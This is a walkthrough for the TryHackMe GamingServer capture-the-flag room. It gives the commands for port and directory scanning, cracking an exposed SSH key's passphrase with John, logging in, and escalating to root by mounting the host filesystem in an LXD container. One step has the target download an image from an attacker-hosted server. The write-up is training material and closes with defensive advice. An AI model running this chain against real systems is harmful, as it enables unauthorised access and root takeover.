# TryHackMe — GamingServer (Easy) Walkthrough

> Room: **GamingServer** (Easy)  
> Goal: Gain initial access, then escalate to root.

This room is a straightforward chain:
**Nmap → Web enumeration → encrypted SSH key → SSH access → LXD/LXC privilege escalation → root flag**

---

## 1) Recon (Nmap)

Start with a full TCP scan with default scripts and version detection:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV --min-rate=1000 -T4 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `22/tcp` — SSH (OpenSSH 7.6p1)
- `80/tcp` — HTTP (Apache 2.4.29 on Ubuntu)

This tells you the attack surface is basically: **website + SSH**.

---

## 2) Web enumeration (Gobuster)

Since `80/tcp` is open, enumerate hidden directories:

```/dev/null/gobuster.txt#L1-1
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

Notable findings:

- `/robots.txt`
- `/secret/`
- `/uploads/`

### 2.1) `/secret/` → encrypted SSH private key

Visiting `/secret/` reveals an SSH private key file (encrypted with a passphrase).

Download that key to your attacking machine (either via browser download or `wget/curl`).

**Important:** If you plan to use it with SSH, fix permissions:

```/dev/null/chmod.txt#L1-1
chmod 600 id_rsa
```

### 2.2) Find the username

The room hints the username in web content (for example a comment on the page). In this writeup, the user is:

- `john`

---

## 3) Crack the SSH key passphrase (ssh2john → john)

Because the key is passphrase-protected, convert it into a format John can crack:

```/dev/null/ssh2john.txt#L1-2
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Once John recovers the passphrase, you can use the key for SSH.

---

## 4) SSH login (initial access)

SSH into the target using the key:

```/dev/null/ssh.txt#L1-1
ssh -i id_rsa john@<IP_ADDRESS>
```

When prompted, enter the passphrase that John recovered.

At this point you should have a shell as `john`.

---

## 5) Post-exploitation enumeration (find privesc path)

A quick check that often pays off:

```/dev/null/id_groups.txt#L1-2
id
groups
```

In this room, the key privilege escalation clue is that the user is able to use **LXD/LXC** (commonly via membership in the `lxd` group). This is effectively “root-level” access on many systems if misconfigured.

Also confirm LXD tooling exists:

```/dev/null/lxc_check.txt#L1-2
lxc --version
lxc image list
```

If these commands work and you’re in the right group, you can proceed.

---

## 6) Privilege escalation to root — LXD/LXC (detailed explanation)

### 6.1) Why LXD/LXC can give root
LXD is a system container manager. If your user can create/manage LXD containers, you can typically:

1. Launch a container as root *inside the container*
2. Mount the host filesystem into the container (e.g., mount `/` somewhere)
3. Read/modify host files as root through that mount

Even though you are “root in the container”, when the container is granted access to a host mount, it becomes effectively **root on the host** for those mounted paths.

**In short:** *LXD group membership is a high-impact misconfiguration.*

---

### 6.2) Prepare an Alpine container image (attacker machine)
A simple, common approach is to use an Alpine Linux LXD image.

On your attacking machine, build the image (one common method is using an Alpine builder repo) and produce something like:

- `alpine.tar.gz`

Then host it so the target can download it. For example:

```/dev/null/http_server.txt#L1-1
python3 -m http.server 8000
```

This will serve files in your current directory on port `8000`.

---

### 6.3) Transfer the image to the target
On the compromised target (as `john`), download it from your attacker:

```/dev/null/wget.txt#L1-1
wget http://<YOUR_IP>:8000/alpine.tar.gz
```

---

### 6.4) Import the image into LXD
Import the downloaded image and give it an alias:

```/dev/null/lxc_import.txt#L1-1
lxc image import alpine.tar.gz --alias alpine
```

Confirm it exists:

```/dev/null/lxc_list.txt#L1-1
lxc image list
```

---

### 6.5) Create a container and mount the host root filesystem
Create/init a new container from the image:

```/dev/null/lxc_init.txt#L1-1
lxc init alpine privesc
```

Now mount the host’s `/` into the container at a mountpoint like `/mnt/root`:

```/dev/null/lxc_mount.txt#L1-1
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

**What this does:**
- `source=/` is the host filesystem root
- `path=/mnt/root` is where it will appear inside the container
- `recursive=true` ensures nested mount points are handled properly

---

### 6.6) Start the container and get a shell inside it
Start the container:

```/dev/null/lxc_start.txt#L1-1
lxc start privesc
```

Execute a shell inside:

```/dev/null/lxc_exec.txt#L1-1
lxc exec privesc /bin/sh
```

You should now be root inside the container. Confirm:

```/dev/null/whoami.txt#L1-2
id
whoami
```

---

### 6.7) Access the host filesystem and retrieve the root flag
Because the host filesystem is mounted at `/mnt/root`, you can now access host files directly.

To locate the root flag:

```/dev/null/find_rootflag.txt#L1-1
find /mnt/root -type f -name root.txt 2>/dev/null
```

In this room, the flag is located at:

- `/mnt/root/root/root.txt`

Read it:

```/dev/null/cat_flag.txt#L1-1
cat /mnt/root/root/root.txt
```

---

## 7) Summary (attack chain)

1. `nmap` → find `80` and `22`
2. `gobuster` → discover `/secret/` with an encrypted SSH key
3. `ssh2john` + `john` → crack the key passphrase
4. `ssh -i` → access as `john`
5. LXD/LXC available (user can manage containers)
6. Import Alpine image → mount host `/` into container → root-level access to host filesystem
7. Read `/root/root.txt`

---

## Notes / Defensive takeaways (brief)

- Don’t expose private keys over HTTP.
- Enforce strong passphrases (and rotate keys if leaked).
- Treat membership in the `lxd` group as equivalent to root:
  - restrict who can use it
  - audit LXD access and container permissions
  - consider disabling LXD if not needed